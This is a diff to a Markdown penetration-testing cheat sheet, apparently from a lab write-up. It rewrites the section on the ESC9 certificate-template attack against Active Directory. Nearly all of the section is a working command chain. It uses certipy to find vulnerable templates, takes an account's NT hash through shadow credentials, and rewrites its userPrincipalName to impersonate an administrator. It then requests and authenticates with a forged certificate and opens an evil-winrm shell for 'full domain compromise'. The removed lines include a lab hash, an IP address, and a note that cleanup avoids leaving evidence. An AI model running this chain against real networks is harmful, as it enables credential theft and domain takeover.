@@ -1637,29 +1637,31 @@ certipy auth -pfx dc.pfx -dc-ip <DC_IP>
 # → DC machine account hash → DCSync
 ```
 
-### ESC9 — Certified Pre-Owned
+### ESC9 — Certified Pre-Owned (UPN manipulation)
 > **When:** requires three conditions to align: a certificate template with CT_FLAG_NO_SECURITY_EXTENSION set (so issued certs don't embed the requester's SID), the CA not enforcing strong certificate mapping (StrongCertificateBindingEnforcement not set to Full), and the attacker having write access to a userPrincipalName attribute on an account that also has enrollment rights on that template.
 ```bash
-certipy find -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.33.203 -vulnerable -stdout
+# [lin] Identify ESC9-vulnerable templates
+certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -vulnerable -stdout
 
-# Obtain the enrolling account's NT hash (shadow credentials attack, abusing your write access):
-certipy shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.33.203
+# [lin] Obtain the enrolling account's NT hash (shadow credentials attack, abusing your write access)
+certipy shadow auto -u <USER>@<DOMAIN> -hashes <HASH> -account <TARGET_USER> -dc-ip <IP>
 
-# Change that account's own userPrincipalName to the target identity you want to impersonate (e.g. administrator):
-certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator -dc-ip 10.129.33.203
+# [lin] Change that account's own userPrincipalName to the identity you want to impersonate
+certipy account update -u <USER>@<DOMAIN> -hashes <HASH> -user <TARGET_USER> -upn <UPN> -dc-ip <IP>
 
-# Request a certificate as that account through the vulnerable template — the cert now carries UPN=administrator:
-certipy req -u ca_operator@certified.htb -hashes <ca_operator_hash> -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.33.203
+# [lin] Request a certificate as that account through the vulnerable template — cert now carries UPN=<UPN>
+certipy req -u <TARGET_USER>@<DOMAIN> -hashes <TARGET_HASH> -ca <CA> -template <TEMPLATE> -dc-ip <IP>
 
-# Revert the UPN back to its original value (cleanup, prevents breaking the account's normal logon and avoids leaving evidence):
-certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator -dc-ip 10.129.33.203
+# [lin] Revert the UPN back to its original value (cleanup)
+certipy account update -u <USER>@<DOMAIN> -hashes <HASH> -user <TARGET_USER> -upn <TARGET_USER> -dc-ip <IP>
 
-# Authenticate with the resulting .pfx — since the CA doesn't enforce strong mapping, the DC resolves identity from the UPN embedded in the cert and hands back the target account's NT hash:
-certipy auth -pfx administrator.pfx -dc-ip 10.129.33.203
+# [lin] Authenticate with the resulting .pfx — DC resolves identity from the UPN embedded in the cert
+certipy auth -pfx <UPN>.pfx -domain <DOMAIN> -dc-ip <IP>
 
-# Use the returned Administrator NT hash for full domain compromise:
-evil-winrm -i 10.129.33.203 -u administrator -H <admin_nt_hash>
+# [lin] Use the returned NT hash for full domain compromise
+evil-winrm -i <IP> -u <UPN> -H <TARGET_HASH>
 ```
+
 
 ### Post-Cert Authentication
 ```bash
